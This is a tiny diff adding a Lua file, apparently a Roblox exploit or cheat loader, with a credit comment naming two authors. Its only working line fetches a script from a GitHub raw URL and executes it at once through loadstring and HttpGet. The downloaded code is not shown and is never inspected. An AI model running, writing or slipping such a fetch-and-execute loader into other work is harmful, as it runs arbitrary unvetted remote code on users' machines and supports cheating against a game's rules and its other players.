@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/slappedboxed/slapped.vipaddon/refs/heads/main/rizzy"))()
+
+-- made by slappedyouonprison & coryuu
